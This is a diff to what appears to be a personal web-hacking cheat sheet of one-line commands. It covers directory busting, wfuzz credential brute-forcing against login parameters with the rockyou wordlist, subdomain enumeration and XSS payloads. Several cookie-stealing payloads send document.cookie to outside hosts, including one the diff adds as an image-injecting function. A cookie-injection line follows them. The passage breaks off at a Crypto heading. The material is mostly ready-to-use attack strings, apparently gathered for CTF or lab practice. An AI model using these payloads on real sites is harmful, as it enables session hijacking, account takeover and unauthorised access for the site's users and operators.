@@ -1,11 +1,13 @@
 ####Web Hacking
 
 ##Directory Busting
-Gobuster----gobuster -u &lt;ip&gt; -w /usr/share/dirb/wordlists/big.txt
+Gobuster----gobuster dir -u &lt;ip&gt; -w /usr/share/dirb/wordlists/big.txt
 Dirbuster----dirb http://target/directory/ /usr/share/dirb/wordlists/common.txt
 Find Parameters Wordlists----find . | grep -i param
 Bust Parameter Names----wfuzz --hw 0 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://target.com/shell.php?FUZZ=id
 Wfuzz Headers Through Proxy----wfuzz -u http://example.com/admin.php -H FUZZ:127.0.0.1 -w /usr/share/headers.txt -p 127.0.0.1:8080:HTTP
+Wfuzz Multiple Parameters----wfuzz --hh 19 -u "http://10.10.36.35:8081/auth?login=FUZZ&password=FUZ2Z" -z file,users.txt -z file,/usr/share/wordlists/rockyou.txt
+Wfuzz Subdomain Enumeration----wfuzz --hl 107 -u http://10.10.116.180 -H "Host: FUZZ.cmess.thm" -w /usr/share/wordlists/commonspeak2-subdomains.txt
 
 ##Local File Inclusion
 List of Windows Files----<a href="http://pwnwiki.io/?_escaped_fragment_=presence/windows/blind.md#!presence/windows/blind.md">Windows Blind Files</a>
@@ -34,11 +36,11 @@ SVG - No spaces----&lt;svg/OnLoad="`${prompt``}`"&gt;
 Cookie Stealing----&lt;script&gt;document.write('&lt;img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '"&gt;')&lt;/script&gt;
 Cookie Stealing----&lt;iframe src=http://10.2.188.2 onload="this.src='http://10.2.188.2?' + document.cookie"&gt;
 
-XSS Web Request----
-http://challenge.acictf.com:61470/search?search=foo&foobarh00p%3Csvg//onload%3d%22alert(1)%22%3E=%3Cscript%3E
-=======
+XSS Web Request----http://challenge.acictf.com:61470/search?search=foo&foobarh00p%3Csvg//onload%3d%22alert(1)%22%3E=%3Cscript%3E
 SVG - No spaces----&lt;svg/OnLoad="`${prompt``}`"&gt;
 Cookie Stealing----&lt;script&gt;document.write('&lt;img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '"&gt;')&lt;/script&gt;
+Cookie Stealing (with img)----function addImage(){var img = document.createElement('img');img.src = 'https://www.hooperlabs.xyz/' + document.cookie; document.body.appendChild(img);}; addImage();
+Update Cookie within Browser----javascript:void(document.cookie="myCookie=thisismystolencookie");
 
 ##Crypto
 ECB (ref)----<
